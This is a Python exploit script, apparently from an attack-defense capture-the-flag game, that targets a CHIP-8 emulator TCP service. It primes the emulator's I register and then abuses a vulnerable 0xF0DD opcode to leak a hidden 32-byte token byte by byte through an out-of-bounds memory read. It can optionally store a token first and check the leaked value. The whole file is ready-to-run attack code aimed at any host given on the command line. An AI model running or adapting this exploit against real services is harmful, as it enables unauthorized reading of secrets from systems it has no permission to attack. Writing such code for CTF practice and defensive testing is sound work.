#!/usr/bin/env python3
"""
Exploit helper for the CHIP-8 TCP service.

This script can optionally store a 32-byte token using the service's
0xFCCC opcode and then leak it via the vulnerable 0xF0DD path. By default
it only leaks the latest in-memory token, which is enough for the typical
post-"put" attack flow in A/D games.
"""
import argparse
import os
import socket

PORT = int(os.environ.get("PORT", "5000"))
TOKEN_LEN = 32


def recv_until(sock: socket.socket, marker: bytes = b"--END--\n", limit: int = 1_000_000) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(data) > limit:
            raise RuntimeError("response too large")
    return data


def send_opcode(sock: socket.socket, opcode: int, payload: bytes = b"") -> bytes:
    sock.sendall(opcode.to_bytes(2, "big") + payload)
    return recv_until(sock)


def must_ok(resp: bytes) -> None:
    if not resp.startswith(b"OK "):
        raise RuntimeError(resp.decode(errors="replace"))


def leak_byte(sock: socket.socket, offset: int) -> int:
    set_op = 0x6000 | (offset & 0xFF)
    must_ok(send_opcode(sock, set_op))
    sock.sendall((0xF0DD).to_bytes(2, "big"))
    leaked = sock.recv(1)
    if not leaked:
        raise RuntimeError("no leak byte")
    return leaked[0]


def leak_token(host: str) -> str:
    s = socket.create_connection((host, PORT), timeout=5)
    _ = recv_until(s)  # hello

    # Prime I so NOTE_BASE + I lands on the hidden buffer when VX is used as an offset.
    must_ok(send_opcode(s, 0xA200))

    out = bytearray()
    for i in range(TOKEN_LEN):
        out.append(leak_byte(s, i))

    s.close()
    return out.decode(errors="replace")


def store_token(host: str, token_id: str, token: str) -> None:
    if len(token_id) == 0 or len(token_id) > 64:
        raise RuntimeError("token_id must be 1..64 chars")
    if len(token) != TOKEN_LEN or token[-1] != "=":
        raise RuntimeError("token must look like a blob")

    s = socket.create_connection((host, PORT), timeout=5)
    _ = recv_until(s)  # hello

    tid = token_id.encode()
    payload = bytes([len(tid)]) + tid + token.encode()
    resp = send_opcode(s, 0xFCCC, payload)
    must_ok(resp)

    s.close()



def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Leak the in-memory token from the CHIP-8 TCP service")
    p.add_argument("host", help="target host")
    p.add_argument("--expect", help="optional expected token to assert after leaking")
    p.add_argument("--store-id", help="optional token id to store before leaking")
    p.add_argument("--store-token", help="token value to store when --store-id is supplied")
    return p.parse_args()


def main() -> int:
    args = parse_args()

    if args.store_id or args.store_token:
        if not (args.store_id and args.store_token):
            raise SystemExit("--store-id and --store-token must be provided together")
        store_token(args.host, args.store_id, args.store_token)

    token = leak_token(args.host)
    print(token)

    if args.expect and token != args.expect:
        raise RuntimeError("unexpected token contents")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
